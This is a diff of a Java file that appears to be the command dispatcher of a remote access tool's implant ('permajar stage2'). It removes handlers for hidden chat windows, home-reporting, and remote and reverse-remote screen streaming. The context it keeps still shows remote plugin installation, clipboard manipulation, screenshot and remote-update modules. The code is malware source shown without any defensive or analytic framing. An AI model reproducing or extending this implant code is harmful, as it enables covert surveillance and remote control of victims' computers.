@@ -20,8 +20,6 @@ package subterranean.crimson.permajar.stage2;
  */
 
 import java.io.IOException;
-import java.net.ServerSocket;
-import java.net.Socket;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.ArrayList;
@@ -36,9 +34,6 @@ import subterranean.crimson.permajar.stage1.network.Communications;
 import subterranean.crimson.permajar.stage2.modules.ClipboardManipulator;
 import subterranean.crimson.permajar.stage2.modules.GetInfo;
 import subterranean.crimson.permajar.stage2.modules.Power;
-import subterranean.crimson.permajar.stage2.modules.PrivCheck;
-import subterranean.crimson.permajar.stage2.modules.QuickDownload;
-import subterranean.crimson.permajar.stage2.modules.QuickUpload;
 import subterranean.crimson.permajar.stage2.modules.RemoteUpdate;
 import subterranean.crimson.permajar.stage2.modules.RestartClient;
 import subterranean.crimson.permajar.stage2.modules.ScreenShot;
@@ -52,22 +47,12 @@ import subterranean.crimson.universal.EncType;
 import subterranean.crimson.universal.GetFileInfo;
 import subterranean.crimson.universal.Logger;
 import subterranean.crimson.universal.Platform;
-import subterranean.crimson.universal.RoutingTable;
 import subterranean.crimson.universal.SigarCollection;
 import subterranean.crimson.universal.StreamStore;
-import subterranean.crimson.universal.Utilities;
 import subterranean.crimson.universal.Version;
 import subterranean.crimson.universal.containers.Message;
-import subterranean.crimson.universal.containers.TransferContainer;
 import subterranean.crimson.universal.objects.InvalidObjectException;
 import subterranean.crimson.universal.objects.ObjectTransfer;
-import subterranean.crimson.universal.streams.PreviewStream;
-import subterranean.crimson.universal.streams.RemoteStream;
-import subterranean.crimson.universal.streams.Stream;
-import subterranean.crimson.universal.streams.infostream.InfoStream;
-import subterranean.crimson.universal.transfer.DownloadTransfer;
-import subterranean.crimson.universal.transfer.Transfer;
-import subterranean.crimson.universal.transfer.UploadTransfer;
 import subterranean.crimson.universal.translation.T;
 
 public enum Executor {
@@ -408,56 +393,11 @@ public enum Executor {
 			Stage2.chat.addMessage((String) m.auxObject[0], (String) m.auxObject[1]);
 			break;
 		}
-		case CHAT_invisible: {
-			Stage2.chat.setVisible(false);
-			break;
-		}
-		case CHAT_visible: {
-			Stage2.chat.setVisible(true);
-			if (!(boolean) m.auxObject[0]) {
-				// hide the buttons
-				Logger.add("Hiding buttons");
-				subterranean.crimson.universal.Utilities.removeMinMaxClose(Stage2.chat);
-
-			}
-
-			break;
-		}
-		case CHAT_isSessionOpen: {
-			Message mres = new Message(m.getStreamID(), m.getName(), Stage2.chat.isVisible());
-			Communications.sendHome(mres);
-
-			break;
-		}
 		case BMN.PLUGIN_install: {
 			byte[] p = (byte[]) m.auxObject[0];
 			String pac = (String) m.auxObject[1];
 			PluginOperations.installRemote(p, pac);
 
-			break;
-		}
-		case STREAM_control_start_preview: {
-			PreviewStream ps = new PreviewStream((long) m.auxObject[1], false, (int) m.auxObject[2]);
-			ps.setStreamID((int) m.auxObject[0]);
-			StreamStore.streams.add(ps);
-			break;
-		}
-		case STREAM_control_start_info: {
-			InfoStream ps = new InfoStream((long) m.auxObject[1], false);
-			ps.setStreamID((int) m.auxObject[0]);
-			StreamStore.streams.add(ps);
-			break;
-		}
-		case STREAM_control_start_remote: {
-			RemoteStream rs = new RemoteStream(1000, false);
-			rs.setStreamID((int) m.auxObject[0]);
-			StreamStore.streams.add(rs);
-			break;
-		}
-		case BMN.STREAM_control_start_reverse_remote: {
-			RemoteStream rs = new RemoteStream(1000, false);// add player
-			rs.setStreamID((int) m.auxObject[0]);
-			StreamStore.streams.add(rs);
 			break;
 		}
 		case BMN.STREAMCONTROL_start: {
